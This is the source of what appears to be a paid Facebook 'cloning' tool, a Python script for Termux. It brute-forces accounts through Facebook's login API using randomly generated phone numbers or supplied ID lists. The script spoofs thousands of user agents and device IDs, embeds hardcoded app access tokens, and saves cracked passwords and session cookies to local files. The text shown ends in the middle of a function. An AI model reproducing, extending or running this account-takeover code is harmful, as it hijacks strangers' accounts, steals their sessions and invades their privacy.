
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')

try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python SHAIKH_enc.py')
os.system('git pull -q')

W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
IPGD ='\33[1;32m'

# modl chks
print(' checking modules...!')
import marshal, zlib

gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
for xd in range(10000):
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c=f' en-us; {str(gt)}'
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for agent in range(10000):
	aa='Mozilla/5.0 (Linux; Android 6.0.1;'
	b=random.choice(['6','7','8','9','10','11','12','13'])
	c='en-us; 10; T-Mobile myTouch 3G Slide Build/GRI40)I148V)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/533.1'
	fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
	ugen.append(fullagnt)
rug=[]
for nt in range(10000):
	rr=random.randint
	aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	rx=random.randrange(1, 999)
	xx=f"Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
	rug.append(xx)
ruz=[]
for mtc in range(10000):
	rr=random.randint
	xd=f"Mozilla/5.0 (Macintosh; Intel Mac OS {str(rr(7,15))} {str(rr(7,15))}_{str(rr(1,9))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))} Safari/537.36 OPR/{str(rr(99,199))}.0.{str(rr(3999,4999))}.{str(rr(99,150))}"
	ruz.append(xd)
	
#new ua
ugen=[]
for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/533.1'
        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(fullagnt)

sim_id = ''
android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fblc = 'en_GB'
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
except:
        fbcr = 'Zong'
fbmf = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbd = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbdv = model
fbsv = android_version
fbca = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
fbdm = '{density=2.0,height='+subprocess.check_output('getprop ro.hwui.text_large_cache_height',shell=True).decode('utf-8').replace('\n','')+',width='+subprocess.check_output('getprop ro.hwui.text_large_cache_width',shell=True).decode('utf-8').replace('\n','')
try:
        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')
        total = 0
        for i in fbcr:
                total+=1
        select = ('1','2')
        if select == '1':
                fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[0].replace('\n','')
                sim_id+=fbcr
        elif select == '2':
                try:
                        fbcr = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
                        sim_id+=fbcr
                except Exception as e:
                        fbcr = "Zong"
                        sim_id+=fbcr
        else:
                fbcr = 'Zong'
                sim_id+=fbcr
except:
        fbcr = "Zong"
device = {
        'android_version':android_version,
        'model':model,
        'build':build,
        'fblc':fblc,
        'fbmf':fbmf,
        'fbbd':fbbd,
        'fbdv':model,
        'fbsv':fbsv,
        'fbca':fbca,
        'fbdm':fbdm}

def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/135.0.0.30.70;FBBV/137289708;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/137289708;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/GT-N7105;FBSV/7.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"

logo=(f"""\
   ___    _   _  _____  _  _   _  _   _ 
  (  _`\ ( ) ( )(  _  )(_)( ) ( )( ) ( )
\033[96;1m  | (_(_)| |_| || (_) || || |/'/'| |_| |
  \033[96;1m`\__ \ |  _  ||  _  || || , <  |  _  |
\033[97;1m  ( )_) || | | || | | || || |\`\ | | | |
  `\____)(_) (_)(_) (_)(_)(_) (_)(_) (_)   \033[92;1m XD
\033[1;37m----------------------------------------------
 [â¢] Author     :  KIVN
 [â¢] Facebook   :  KIVN
 [â¢] Tool       :  PAID
 [â¢] Version    :  10.4
\033[1;37m----------------------------------------------""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sâ¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [â¢]%s Active Apks & Web ð '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sâ¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [â¢]%s Expired Apks & Web ð '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def pp():
	try:
			ky = open('/sdcard/Android/.nonmedia.js','r').read()
	except(FileNotFoundError):
			op = uuid.uuid1().hex.upper()
			open('/sdcard/Android/.nonmedia.js','w').write(op)
			pp()
	except(KeyError,OSError,IOError):
			linex()
			os.system('termux-setup-storage')
			print(' [Ã] allow storage permission ')
			pp()
	if len(ky) > 32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
	if len(ky) <32:
			os.system('rm -rf /sdcard/Android/.nonmedia.js')
			pp()
def menu():
			pp()
			clear()
		#	linex()
			print(' [1] File cloning\n [2] Random cloning \n [3] join whatsap group \n [0] Exit menu')
			linex()
			xd=input(' Choose an option: ')
		#	os.system('xdg-open)
			if xd in ['1','01']:
				clear()
				print(' Put file example:  /sdcard/File.txt  etc..')
				linex()
				file = input(' Put file path\033[1;37m: ')
				try:
					fo = open(file,'r').read().splitlines()
				except FileNotFoundError:
					print(' File location not found ')
					time.sleep(1)
					menu()
				clear()
				
				plist = []
				try:
					ps_limit = int(input(' How many passwords do you want to add ? '))
				except:
					ps_limit =1
				clear()
				print('\033[1;32m exp: first last,firtslast,first123')
				linex()
				for i in range(ps_limit):
					plist.append(input(f' Put password {i+1}: '))
				clear()
				print(' Do you want to show cp account? (y/n): ')
				linex()
				cx=input(' Choose: ')
				if cx in ['y','Y','yes','Yes','1']:
					pcp.append('y')
				else:
					pcp.append('n')
				clear()
				print(' [1] Method M1 \n [2] Method M2 \n [3] Method M3')
				linex()
				mth = input(' Choose : ')
				with tred(max_workers=30) as crack_submit:
					clear()
					total_ids = str(len(fo))
					print(' Total account ids : \033[1;32m'+total_ids+f' ')
					print(' \033[1;37mThe process is running in the background')
					linex()
					for user in fo:
						ids,names = user.split('|')
						passlist = plist
						if mth =='1':
							crack_submit.submit(api2,ids,names,passlist)
						elif mth =='2':
							crack_submit.submit(api,ids,names,passlist)
						elif mth == '3':
							crack_submit.submit(api3,ids,names,passlist)
						else:
							crack_submit.submit(api,ids,names,passlist)
				print('\033[1;37m')
				linex()
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				linex()
				input(' Press enter to back ')
				os.system('python SHAIKH-DEC_enc.py')
			elif xd in ['2','02']:
				ph()
			elif xd in ['3','03']:
				os.system('xdg-open https://chat.whatsapp.com/E9qcXs9EcwE7JAXW2l2hR3')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use ð¥° ')
			else:
				exit(' Option not found in menu...')

def ph():
		user=[]
		clear()
		print('\033[1;35m Code example: +63919,+63931,+63941,+63993')
		code = input('\033[1;37m put code: ')
		try:
			limit = int(input('\033[1;35m example: 2000, 3000, 5000, 10000\n\033[1;37m put limit: '))
		except ValueError:
			limit = 5000
		clear()
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as zain:
			clear()
			tl = str(len(user))
			print(' Total ids : \033[1;32m'+tl+f' ')
			print(f'\033[1;37m Choice code  :\033[1;32m '+code)
			print(' \033[1;37mThe process is running in the background')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'gandako','pogiko','magandaako','pogiako','cuteko','iloveyou','i love you','cuteko123','maganda123','pogi123','putanginamo','iloveyou143']
				zain.submit(rd1,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python SHAIKH_enc.py')

def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SHAIKH-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,99))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(1111111,9999999))+";[FBAN/Orca-Android;FBAV/195.0.0.11.100;FBBV/29420087;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-J200Y;FBSV/8.0;FBCA/armeabi-v7a:armeabi;]"
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        data = {
                                'adid': adid,
                                'format': 'json', 
                                'device_id': device_id,
                                'email': ids, 
                                'password': pas, 
                                'generate_analytics_claims': '1', 
                                'credentials_type': 'password', 
                                'source': 'login', 
                                'error_detail_type': 
                                'button_with_disabled', 
                                'enroll_misauth': 'false', 
                                'generate_session_cookies': '1',
                                'generate_machine_id': '1', 
                                'meta_inf_fbmeta': '',
                                'currently_logged_in_userid': '0',
                                'fb_api_req_friendly_name': 'authenticate'}
                        headers={
                                'User-Agent':uaa(),
                                'Accept-Encoding': 'gzip, deflate', 
                                'Accept': '*/*', 
                                'Connection': 'keep-alive', 
                                'Authorization':f'OAuth {accessToken}', 
                                'X-FB-Friendly-Name': 'authenticate', 
                                'X-FB-Connection-Type': 'unknown', 
                                'Content-Type': 'application/x-www-form-urlencoded', 
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SHAIKH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SHAIKH-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHAIKH-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\x1b[1;31m [SHAIKH-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SHAIKH-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:pass

def api(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [GEO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/135.0.0.30.70;FBBV/137289708;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/137289708;FBCR/Verizon;FBMF/huawei;FBBD/samsung;FBPN/com.facebook.%s;FBDV/GT-N7105;FBSV/7.0.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
                        data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": uaa(),"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [GEO-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;32m Cookie: "+coki)
                                        open('/sdcard/SHAIKH-COKIE.txt','a').write(ids+'|'+pas+ '|' +coki+'\n')
                                        open('/sdcard/SHAIKH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[GEO-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
                                        sys.stdout.write('\r\r\033[1;37m [GEO-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                #print('\r\r\x1b[38;5;205m [GEO-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/SHAIKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                        else:
                                        continue
                loop+=1
        except requests.exceptions.ConnectionError:
            time.sleep(20)
        except Exception as e:
                pass

def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [SHAIKH-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                        ln = fn
                for pw in passlist:
                        pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
                        SEX = f"{random.choice(['Liger', 'METERED', 'MOBILE.EDGE', 'MOBILE.HSPA', 'MOBILE.LTE', 'MODERATE', 'Fiber', 'DSL', 'Satellite', 'Dial-up', 'Fixed Wireless', 'Cable', 'WiMAX'])}"
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/78.0.0.65.21;FBBV/666395;FBDM/{density=4.7,width=1080,height=1920};FBLC/es_PK;FBCR/H2O Wireless;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SGH-I337M;FBSV/5.0.1;nullFBCA/armeabi-v7a:armeabi;]"
                        data = {"adid": str(uuid.uuid4()),
                            "format": "json",
                            "device_id": str(uuid.uuid4()),
                            "cpl": "true",
                            "family_device_id": str(uuid.uuid4()),
                            "credentials_type": "device_based_login_password",
                            "error_detail_type": "button_with_disabled",
                            "source": "register_api",
                            "email": ids,
                            "password": pas,
                            "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                            "generate_session_cookies": "1",
                            "meta_inf_fbmeta": "NO_FILE",
                            "etag":  random.choice(["fcc627766b9d33fa48c7e547d58e96e803c0f5c9", "28cce2d103004681314834a51898159392bd689c","682f553f4392d534c8bd9b9560e891fd6ae7c7e0", "01e11e2774574e9947c56db4ccd2c20c7c7aad08", "cbb9d287bcb664913899541d5fd35b0582c33964"]),
                            "advertiser_id": str(uuid.uuid4()),
                            "currently_logged_in_userid": "0",
                            "locale": "en_US",
                            "client_country_code": "US",
                            "method": "auth.login",
                            "fb_api_req_friendly_name": "authenticate",
                            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                            "api_key": "882a8490361da98702bf97a021ddc14d"}
                        headers = {'User-Agent': uaa(),
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'Host': 'graph.facebook.com',
                            'X-FB-Net-HNI': str(random.randint(20000, 40000)),
                            'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
                            'X-FB-Connection-Type': f'{SEX}',
                            'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
                            'X-FB-Connection-Quality':f'{SEX}',
                            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
                            'X-Tigon-Is-Retry': 'False',
                            'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                            'x-fb-device-group': '5120',
                            'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                            'X-FB-Request-Analytics-Tags': 'graphservice',
                            'X-FB-HTTP-Engine': 'Liger',
                            'X-FB-Client-IP': 'True',
                            'X-FB-Server-Cluster': 'True',
                            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [SHAIKH-OK] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SHAIKH-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SHAIKH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[SHAIKH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'The action attempted has been deemed abusive' in po.get('error', {}).get('message', ''):
